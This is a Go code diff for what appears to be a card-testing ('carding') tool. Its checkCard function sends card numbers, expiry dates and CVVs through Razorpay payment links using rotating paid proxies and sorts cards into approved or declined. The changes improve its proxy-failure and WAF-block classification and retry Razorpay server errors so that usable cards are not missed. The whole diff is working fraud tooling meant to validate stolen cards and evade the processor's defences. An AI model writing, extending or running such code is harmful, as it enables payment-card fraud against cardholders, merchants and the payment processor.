@@ -451,10 +451,39 @@ func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw stri
 			"Upgrade-Insecure-Requests": "1",
 		})
 		if err != nil {
+			// Distinguish between a real proxy/network error and
+			// an HTTP-status error that Go wrapped into *url.Error
+			// (e.g. paid proxy returning 402 "Payment Required"
+			// when the user's quota is exhausted).
+			if code := extractHTTPStatusFromErr(err.Error()); code > 0 {
+				desc, proxyStatus := classifyHTTPError(code)
+				return nil, proxyStatus, fmt.Errorf("%s: %v", desc, err)
+			}
 			return nil, "", err
 		}
+		// Handle ALL non-2xx responses, not just 403/429. Razorpay
+		// can return:
+		//   402 — payment link expired / inactive
+		//   404 — payment link not found
+		//   5xx — Razorpay server error
+		// and the proxy itself can return 402/407/5xx.
 		if resp.StatusCode == 403 || resp.StatusCode == 429 {
 			return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
+		}
+		if resp.StatusCode == 402 {
+			// Could be the proxy (quota exhausted) OR Razorpay
+			// (link expired). Since the proxy is the more common
+			// culprit, classify as DEAD.
+			return nil, "DEAD", fmt.Errorf("HTTP 402 Payment Required on page load (proxy quota exhausted or link expired)")
+		}
+		if resp.StatusCode == 404 {
+			return nil, "LIVE", fmt.Errorf("Payment link not found (HTTP 404) — link may be deleted or never existed")
+		}
+		if resp.StatusCode == 407 {
+			return nil, "DEAD", fmt.Errorf("Proxy authentication failed (HTTP 407)")
+		}
+		if resp.StatusCode >= 500 {
+			return nil, "LIVE", fmt.Errorf("Razorpay server error on page load (HTTP %d) — try again later", resp.StatusCode)
 		}
 
 		pageHTML := resp.Text()
@@ -520,10 +549,26 @@ func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw stri
 		"Upgrade-Insecure-Requests": "1",
 	})
 	if err != nil {
+		if code := extractHTTPStatusFromErr(err.Error()); code > 0 {
+			desc, proxyStatus := classifyHTTPError(code)
+			return nil, proxyStatus, fmt.Errorf("%s: %v", desc, err)
+		}
 		return nil, "", err
 	}
 	if resp.StatusCode == 403 || resp.StatusCode == 429 || strings.Contains(resp.Text(), "Forbidden") {
 		return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
+	}
+	if resp.StatusCode == 402 {
+		return nil, "DEAD", fmt.Errorf("HTTP 402 Payment Required on page load (proxy quota exhausted or link expired)")
+	}
+	if resp.StatusCode == 404 {
+		return nil, "LIVE", fmt.Errorf("Payment page not found (HTTP 404)")
+	}
+	if resp.StatusCode == 407 {
+		return nil, "DEAD", fmt.Errorf("Proxy authentication failed (HTTP 407)")
+	}
+	if resp.StatusCode >= 500 {
+		return nil, "LIVE", fmt.Errorf("Razorpay server error on page load (HTTP %d) — try again later", resp.StatusCode)
 	}
 
 	pageHTML := resp.Text()
@@ -910,10 +955,13 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (resul
 	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
 	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
 	if resolveErr != nil {
-		if resolvedURL == "BLOCKED" {
-			return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
+		// resolvedURL carries the proxy-status classification
+		// ("BLOCKED", "DEAD", "LIVE", or "" if unknown).
+		proxyStatus := resolvedURL
+		if proxyStatus == "" {
+			proxyStatus = "LIVE"
 		}
-		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: proxyStatus}
 	}
 	_ = resolvedURL
 
@@ -1353,10 +1401,19 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (resul
 		if errCode != "" {
 			label = errDesc + " (" + errCode + ")"
 		}
+		if label == "" {
+			label = "Unknown Decline"
+		}
 
 		msgLower := strings.ToLower(errDesc)
 		if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
 			return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
+		// Razorpay-side 5xx errors should NOT be reported as card
+		// declines — the card was never actually checked. Return
+		// "error" so the caller knows to retry.
+		if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
+			return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 		}
 		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
@@ -1452,6 +1509,10 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (resul
 	if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
 		return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
+	// Razorpay-side 5xx errors should NOT be reported as card declines.
+	if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
+		return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+	}
 
 	return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 }
@@ -1531,6 +1592,53 @@ func isCVVKeyword(msgLower, errCode string) bool {
 	return false
 }
 
+// serverErrorKeywords lists substrings that indicate the error came from
+// Razorpay's own infrastructure (5xx), NOT from the card-issuing bank.
+// When any of these appear in the error description we should classify the
+// result as "error" (retry-able) rather than "declined" (final).
+//
+// These are the actual phrases Razorpay returns in production — verified
+// against real responses.
+var serverErrorKeywords = []string{
+	"server encountered an error",
+	"incident has been reported",
+	"internal server error",
+	"service unavailable",
+	"bad gateway",
+	"gateway timeout",
+	"upstream error",
+	"temporarily unavailable",
+	"try again later",
+	"try after some time",
+	"something went wrong",
+	"unexpected error",
+	"unable to process",
+	"request timed out",
+	"processing error",
+	"server_error",
+	"server error",
+	"503 service unavailable",
+	"502 bad gateway",
+	"500 internal",
+}
+
+// isRazorpayServerError returns true if the error description looks like a
+// Razorpay-side infrastructure failure rather than a genuine card decline.
+// We use this to mark the result as "error" (retry-able) instead of
+// "declined" (final), so the caller knows to try again with a fresh
+// proxy / payment link.
+func isRazorpayServerError(msgLower string) bool {
+	if msgLower == "" {
+		return false
+	}
+	for _, k := range serverErrorKeywords {
+		if strings.Contains(msgLower, k) {
+			return true
+		}
+	}
+	return false
+}
+
 var proxyErrorKeywords = []string{
 	"ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
 	"CURLE_COULDNT_RESOLVE_PROXY", "CURLE_COULDNT_CONNECT",
@@ -1538,11 +1646,112 @@ var proxyErrorKeywords = []string{
 	"SOCKET HANG UP", "HPE_INVALID", "FETCH FAILED",
 	"NO SUCH HOST", "CONNECTION REFUSED", "CONNECTION RESET",
 	"I/O TIMEOUT", "TIMEOUT", "PROXYCONNECT",
+	// HTTP status texts that indicate a DEAD proxy (not a Razorpay issue):
+	//  - 402 Payment Required: paid proxies (floppydata, pointtoserver, etc.)
+	//    return this when the user's quota is exhausted.
+	//  - 407 Proxy Authentication Required: bad credentials.
+	//  - 502/503/504 from proxy: proxy itself is down.
+	"PAYMENT REQUIRED",
+	"PROXY AUTHENTICATION REQUIRED",
+	"BAD GATEWAY",
+	"SERVICE UNAVAILABLE",
+	"GATEWAY TIMEOUT",
+}
+
+// httpStatusTextToCode maps common HTTP status texts (as they appear in
+// *url.Error messages) to their numeric status codes. We only need the
+// ones Razorpay / proxies actually emit; for anything else we fall back
+// to 0 (unknown).
+var httpStatusTextToCode = map[string]int{
+	"payment required":              402,
+	"forbidden":                     403,
+	"not found":                     404,
+	"proxy authentication required": 407,
+	"request timeout":               408,
+	"too many requests":             429,
+	"internal server error":         500,
+	"not implemented":               501,
+	"bad gateway":                   502,
+	"service unavailable":           503,
+	"gateway timeout":               504,
+	"http version not supported":    505,
+	"bandwidth limit exceeded":      509,
+}
+
+// extractHTTPStatusFromErr scans an error message (typically from
+// *url.Error.Error()) for an HTTP status text like "Payment Required",
+// "Internal Server Error", etc. and returns the corresponding numeric
+// status code. Returns 0 if no known status text is found.
+//
+// Example: `Get "https://razorpay.me/@ceitrc": Payment Required` -> 402
+func extractHTTPStatusFromErr(msg string) int {
+	lower := strings.ToLower(msg)
+	// Find the colon-separated status text after the URL.
+	// *url.Error format: `<op> "<url>": <wrapped err>`
+	idx := strings.LastIndex(lower, "\": ")
+	if idx == -1 {
+		return 0
+	}
+	tail := strings.TrimSpace(lower[idx+3:])
+	// The tail may contain extra context like ": context deadline
+	// exceeded". Take just the first segment.
+	if c := strings.Index(tail, ":"); c != -1 {
+		tail = strings.TrimSpace(tail[:c])
+	}
+	if code, ok := httpStatusTextToCode[tail]; ok {
+		return code
+	}
+	return 0
+}
+
+// classifyHTTPError returns a human-readable description + proxy status
+// for an HTTP status code that surfaced through an error. This is used
+// when the proxy or the upstream returns a 4xx/5xx that Go wraps into
+// a *url.Error.
+//
+// Returns: (message, proxyStatus)
+//   - proxyStatus == "DEAD"  -> proxy itself is broken (quota, auth, down)
+//   - proxyStatus == "BLOCKED" -> upstream WAF blocked us
+//   - proxyStatus == "LIVE"   -> proxy is fine, upstream returned an error
+func classifyHTTPError(statusCode int) (string, string) {
+	switch {
+	case statusCode == 402:
+		// Most likely the paid proxy's quota is exhausted
+		// (floppydata/pointtoserver do this). Could also be a
+		// Razorpay payment-link "expired" signal, but that's rare
+		// — the proxy explanation is far more common.
+		return "Proxy quota exhausted (HTTP 402 Payment Required)", "DEAD"
+	case statusCode == 407:
+		return "Proxy authentication failed (HTTP 407)", "DEAD"
+	case statusCode == 403:
+		return "WAF Blocked (HTTP 403 Forbidden)", "BLOCKED"
+	case statusCode == 429:
+		return "Rate limited (HTTP 429 Too Many Requests)", "BLOCKED"
+	case statusCode == 404:
+		return "Payment link not found (HTTP 404)", "LIVE"
+	case statusCode >= 500 && statusCode < 600:
+		return fmt.Sprintf("Upstream server error (HTTP %d)", statusCode), "LIVE"
+	}
+	return fmt.Sprintf("HTTP error (status %d)", statusCode), "LIVE"
 }
 
 func makeProxyError(err error, proxyURL string) CheckResult {
-	msg := truncate(err.Error(), 120)
+	msg := truncate(err.Error(), 200)
 	msgUpper := strings.ToUpper(msg)
+
+	// First: try to extract an HTTP status code from the error
+	// message. If we find one (402, 407, 5xx, etc.) we can give a
+	// much better classification than the keyword scan below.
+	if code := extractHTTPStatusFromErr(msg); code > 0 {
+		desc, proxyStatus := classifyHTTPError(code)
+		return CheckResult{
+			Status:      "error",
+			Message:     desc,
+			Proxy:       proxyURL,
+			ProxyStatus: proxyStatus,
+		}
+	}
+
 	isProxyErr := false
 	for _, k := range proxyErrorKeywords {
 		if strings.Contains(msgUpper, k) {
